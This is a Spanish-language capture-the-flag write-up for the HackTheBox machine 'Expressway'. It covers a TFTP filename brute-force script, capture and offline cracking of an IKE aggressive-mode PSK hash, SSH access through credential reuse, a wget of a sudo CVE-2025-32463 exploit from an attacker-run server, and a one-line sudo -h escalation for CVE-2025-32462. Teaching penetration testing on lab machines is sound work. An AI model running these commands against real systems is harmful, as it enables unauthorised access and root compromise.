---
title: "Writeup Expressway - HackTheBox"
date: 2026-03-08 14:00:00 +0100
categories: [Writeups]
tags: [Hackthebox, easy, Linux]
image:
  path: /assets/img/expressway.png
  alt: "Expressway"
  w: 1200     # Ancho real de la imagen en px (recomendado)
  h: 630      # Alto real (ratio típico 1.91:1) — recomendado por Chirpy
---

A modo de resumen, estos son los aspectos que tocaremos en la resolución de este CTF 

| Contenido |
|-----------|
| UDP Scan |
| TFTP (UDP/69) - Bash Scripting - Fuzzing |
| IKE/ISAKMP Enumeration – VPN IPSec (UDP/500) |
| Aggressive Mode Leak – Capturing hash PSK - ike-scan |
| PSK Offline Crack Hash – psk-crack - Access SSH as user ike |
| Privilege Escalation – sudo 1.9.17 - Local Privilege Escalation via chroot (CVE-2025-32463) - host (CVE-2025-32462) |



Siempre que nos enfrentamos a un Pentest, es muy recomendable ir documentando los hallazgos. Para ello, crearemos una serie de directorios que nos ayuden a tener nuestras evidencias bien organizadas 

```bash
mkdir Expressway
cd !$
mkdir {content,nmap,exploits}
```
Con estos 3 directorios se puede ir trabajando de forma más o menos cómoda, pero esto va a gusto del consumidor. Organízalo como más cómodo te sientas, pero organízalo. Más adelante lo agradecerás. 

Como siempre empezamos lanzando un ping para comprobar que la máquina esté activa. Vamos a enviar un paquete y analizar la respuesta. Recibimos un paquete de vuelta, lo que indica que tenemos conectividad con ella. También fijándonos en el valor del TTL, podemos determinar que estamos ante una máquina Linux. Recordar que en Linux este valor siempre es de 64 o cercano a él y en Windows de 128, siempre y cuando no haya sido manipulado. 

```bash
ping -c 1 [IP_Objetivo]
```

![Captura de pantalla 1](/assets/img/expressway_ctf/4.jpg)

Lo siguiente que haremos será ver qué puertos hay abiertos empleando nmap. Como siempre, realizamos el escaneo en dos partes. La primera nos reporta los puertos y abiertos; y el segundo escaneo es para ver la versión del servicio que corre en los puertos indicados, así como para lanzar un conjunto de scripts básicos de reconocimiento que trae por defecto nmap y nos pueden ayudar a enumerar mejor el objetivo. 

```bash
sudo nmap -p- --open -sS -vvv -n -Pn [IP_Objetivo] -oG [Archivo]
sudo nmap -sC -sV -p22 [IP_Objetivo] -oN [Archivo]
```

![Captura de pantalla 2](/assets/img/expressway_ctf/6.jpg)

En este caso, nmap solo nos reporta abierto el puerto 22 (SSH) y tras no encontrar nada explotable en este servicio, ampliamos nuestro radio de análisis al protocolo UDP. Empezaremos escaneando los 200 puertos más comunes y si no encontramos nada, pues aumentamos el alcance. 

```bash
sudo nmap -sU -sV -T4 --top-ports 200 [IP_Objetivo] -oN udp_scan
```

![Captura de pantalla 3](/assets/img/expressway_ctf/7.jpg)


Ahora ya sí, tenemos más información. Vamos a centrarnos principalmente en dos puertos. El puerto 69 (TFTP) y el puerto 500 (ISAKMP)

Vemos abierto el puerto 69 (TFTP). Trivial File Transfer Protocol, es un protocolo de red muy simple para transferir archivos pequeños entre sistemas, comúnmente usado para arrancar dispositivos o cargar firmware sin autenticación. Carece de seguridad, cifrado y listado de directorios, lo que lo hace vulnerable y no recomendado. Podemos echarle un vistazo a esto. Dado que TFTP no nos permite listar directorios, lo que podemos tratar de hacer es un pequeño script que nos vaya probando nombres comunes de archivos, y si existen, que nos lo descargue. Podemos probar el diccionario tftp.txt de Metasploit. También hay un módulo de Metasploit que podemos utilizar para enumerarlo, pero vamos a hacerlo de forma manual (auxiliary/scanner/tftp/tftpbruteforce)

```bash
touch tftp_bruteforce.sh
chmod +x tftp_bruteforce.sh
```

```
#!/bin/bash

WORDLIST="/usr/share/metasploit-framework/data/wordlists/tftp.txt"
TARGET="[IP_Objetivo]"
OUTPUT="Files_Find"

mkdir -p "$OUTPUT"

while IFS= read -r i; do
    echo -n "[*] Probando: $i ... "
    
    if atftp --get -l "/tmp/$i" -r "$i" "$TARGET" 2>/dev/null; then
        echo "ENCONTRADO"
        mv "/tmp/$i" "$OUTPUT/" 2>/dev/null
    else
        echo "NO EXISTE"
    fi

done < "$WORDLIST"

```

Ya con nuestro script montado, podemos ejecutarlo de la siguiente forma 

```
bash
./tftp_bruteforce.sh
```

![Captura de pantalla 4](/assets/img/expressway_ctf/16.jpg)

Como vemos, no nos muestra nada, por lo que quiero pensar que no existe ninguno de estos archivos representados en el diccionario, en el servidor y tendremos que pasar a seguir enumerando cosas <br>

Por otra lado, nos muestra abierto el puerto 500 UDP (isakmp). El servicio que responde es ISAKMP, que es el protocolo que usan las VPN IPSec para empezar la conexión. Esto viene a significar que posiblemente hay una VPN IPSec funcionando. IPSec usa IKE/ISAKMP para negociar las claves y autenticación antes de crear el túnel. En este punto, podemos tirar de la herramienta ike-scan que nos va a permitir descubrir y analizar servidores VPN IPSec, centrándose en el protocolo IKE (Internet Key Exchange). Esta herramienta nos va a permitir detectar si el objetivo utiliza IPSec, ver los modos que soporta, obtener información de configuración o incluso capturar hashes si la VPN usa PSK débiles.<br> 

Vamos a empezar lanzando la herramienta en "Main Mode" (-M) para confirmar si hay un servidor IKE y analizar la respuesta 

```bash
sudo ike-scan -M [IP_Objetivo]
```

![Captura de pantalla 5](/assets/img/expressway_ctf/8.jpg)


Podemos ver información interesante, vamos a analizarla. "Enc=3DES" nos indica que se está utilizando un cifrado viejo y debíl. Vemos también que utiliza Hash SHA1, que es un tipo de hash inseguro a día de hoy. "Auth=PSK" nos dice que se autentica usando PSK (Pre-Shared Key), es decir, una contraseña compartida. También vemos "VID" (Vendor IDs), XAUTH y Dead Peer Detection. Esto viene a decirnos que el servidor usa una implementación antigua que a veces puede filtrar información sensible en modo Agresivo (Agressive Mode), por lo tanto, puede ser que el modo agresivo esté habilitado y por lo tanto vamos a comprobarlo. 

```bash
sudo ike-scan -A [IP_Objetivo] -Ppsk.txt
```

![Captura de pantalla 6](/assets/img/expressway_ctf/9.jpg)

En la captura de imagen vemos dos cosas importantes. El servidor está revelando el nombre de usuario de la VPN y además el Hash PSK de 20 Bytes que hemos guardado en el archivo psk.txt. La idea ahora es crackear este hash para obtener la contraseña. Primero vamos a capturar el Hash que representa la contraseña de la VPN (PSK) y la guardaremos como hash.txt. Para hacer esto, podemos emplear el siguiente comando 

```bash
sudo ike-scan -M --aggressive [IP_Objetivo] -n ike@expressway.htb --pskcrack=hash.txt
```

![Captura de pantalla 7](/assets/img/expressway_ctf/10.jpg)

Ahora la idea es tratar de crackear este hash con un ataque de diccionario. Para ello, podemos emplear la herramienta psk-crack que es una herramienta especialmente diseñada para romper PSK obtenidos de IKE Aggresive Mode. 

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```

![Captura de pantalla 8](/assets/img/expressway_ctf/11.jpg)

Pues tenemos la contraseña de la VPN y el usuario. Más que conectarnos por VPN, dado que el puerto 22 SSH está abierto, podemos probar si hay reutilización de credenciales y así ganar acceso al sistema 

```bash
ssh ike@[IP_Objetivo]
Contraseña: ***************
```

En este caso no es necesario realizar un tratamiento de la TTY. Simplemente si estamos acostumbrados a limpiar la consola con CTRL + L, podemos igualar TERM=xterm para que nos funcione y ya está. 

```bash
export TERM=xterm
``

![Captura de pantalla 9](/assets/img/expressway_ctf/14.jpg)

Ganamos acceso al sistema como el usuario ike. Vemos que estamos en un grupo sospechoso (proxy). Ahora investigaremos esto. Antes vamos a localizar la Flag de user.txt 

```bash
find / -type f -name user.txt 2>/dev/null
cat /home/ike/user.txt
```

El siguiente objetivo es convertirnos en usuario root. Para ello, recurrimos a encontrar binarios con SUID y vemos lo siguiente 

```bash
find / -type f -perm -04000 2>/dev/null
```

![Captura de pantalla 10](/assets/img/expressway_ctf/17.jpg)

Nos llama la atención que hay dos binarios "sudo". El primero en /usr/local/bin/sudo y el segundo en /usr/bin/sudo. Esto es raro ya que sudo por defecto se suele encontrar el la segunda ruta. Vamos a investigar esto también un poco más. De hecho si tratamos de ver los permisos a nivel de sudoers de nuestro usuario vamos a ver lo siguiente 

```bash
sudo -l
```

![Captura de pantalla 11](/assets/img/expressway_ctf/18.jpg)

El mensaje que nos muestra es "Sorry, user ike may not run sudo on expressway." pero el mensaje por defecto al lanzar este comando debería ser algo así como " ike is not in the sudoers file. This incident will be reported. ". Puede ser que se esté empleando una versión de sudo modificada. Vamos a ver que versión de sudo se está empleando y ver si hay vulnerabilidades asociadas a ella 

```bash
sudo -V
```

![Captura de pantalla 12](/assets/img/expressway_ctf/19.jpg)

Tenemos la versión 1.9.17. Buscando en Internet vulnerabilidades asociadas a ella, descubrimos los siguientes artículos

```
https://github.com/r3dBust3r/CVE-2025-32463
https://www.incibe.es/index.php/incibe-cert/alerta-temprana/vulnerabilidades/cve-2025-32462
https://socprime.com/blog/cve-2025-32463-and-cve-2025-32462-vulnerabilities/
```

Pues parece ser que está versión de sudo se ve afectada por dos vulnerabilidades.<br>

La primera (CVE-2025-32463) nos habla de que la opción --chroot, que permite indicar un directorio propio como raíz (root) del sistema para ejecutar comandos, tiene un falla importante. Sudo resuelve rutas y carga bibliotecas o archivos de configuración desde ese nuevo root antes de verificar completamente los privilegios. Esto nos puede llevar a inyectar nuestras propias librerías o archivos de configuración, y así poder ejecutar código como root. En este punto, podemos emplear el script que se nos facilita en el repositorio y conseguir root de forma  muy sencilla. Vamos a nuestro directorio /exploits/ y nos clonamos el repositorio. 

```bash
git clone https://github.com/r3dBust3r/CVE-2025-32463.git
cd CVE-2025-32463
```

Ahora nos montamos un servidor web con Python por el puerto 80 para pasarlo a la máquina objetivo 

```bash
python3 -m http.server 80
```

En la máquina objetivo, vamos al directorio /tmp/ y nos lo descargamos con wget 

```bash
cd /tmp/
wget http://[IP_Atacante]/CVE-2025-32463
```

Dado que es un script en bash, vamos a renombrarlo como root_chroot.sh por ejemplo, vamos a darle permisos de ejecución y lo ejecutamos 

```bash
mv CVE-2025-32463 root_chroot.sh
chmod +x root_chroot.sh
```

Si todo va bien, deberíamos ganar una consola como root 

```bash
./root_chroot.sh
```

![Captura de pantalla 13](/assets/img/expressway_ctf/20.jpg)

Tal y como vemos, somos usuario root y podemos visualizar la Flag en el directorio /root/root.txt <br>

Aunque ya tenemos acceso como root y hemos comprometido la máquina, siempre es recomendable seguir examinando cositas y el hecho de que hayamos descubierto dos vulnerabilidades distintas en la versión de sudo, nos hace querer comprobar si también se acontece la otra vulnerabilidad comentada. <br>

La segunda (CVE-2025-32462) nos dice que "cuando se usa sudo con un archivo sudoers que especifica un host que no es ni el host actual ni ALL, permite a los usuarios enumerados ejecutar comandos en máquinas no deseadas." Esto nos sugiere (aprovechando que ya somos root), echarle un vistazo al /etc/sudoers para ver como está configurado a nivel de host 

```bash
cat /etc/sudoers
```

![Captura de pantalla 14](/assets/img/expressway_ctf/21.jpg)

Pues tenemos por ahí un nombre de host diferente al actual que es "offramp.expressway.htb". Aprovechándonos de la vulnerabilidad CVE-2025-32462 también podríamos elevar nuestros privilegios de la siguiente forma 

```bash
/usr/local/bin/sudo -h offramp.expressway.htb /bin/bash
```

![Captura de pantalla 15](/assets/img/expressway_ctf/22.jpg)

Obviamente esta forma de elevar nuestros privilegios es hacer un poco trampa porque hemos podido echarle un vistazo al /etc/sudoers para ver el nombre del host, cosa que no podríamos haber hecho si no fuéramos root. Pero si queremos descubrir el nombre de host de una forma digamos,  más realista, podemos hacer lo siguiente. Recordemos que el usuario ike estaba en un grupo un tanto sospechoso que ya llamó nuestra atención (proxy). Si buscamos archivos relacionados con este grupo, vamos a ver lo siguiente 

```bash
find / -type f -group proxy 2>/dev/null
```

![Captura de pantalla 16](/assets/img/expressway_ctf/23.jpg)

Si vamos revisando estos archivos vamos a ver algo curioso 

```bash
cat /var/log/squid/access.log.1
```

![Captura de pantalla 17](/assets/img/expressway_ctf/24.jpg)


Vemos que un cliente (192.168.68.50) hizo una petición a la URL offramp.expressway.htb y que squid bloqueó la conexión TCP con un código de estado 403 (Forbbiden). Esto puede hacernos pensar que offramp.expressway.htb es un host interno, inaccesible desde fuera. Hilando esto, con la vulnerabilidad CVE-2025-32462 que nos hablaba precisamente de emplear un host diferente, obviamente se nos ocurre comprobar si la versión de sudo vulnerable puede explotarse pasándole este nombre de host, que como ya hemos visto, si que puede hacerse. <br>


Espero que este contenido te haya sido útil para aprender algo nuevo, o al menos ahorrarte unas cuantas horas de frustración.<br>

!Gracias por pasarte por aquí, nos vemos en la próxima!  ❤️



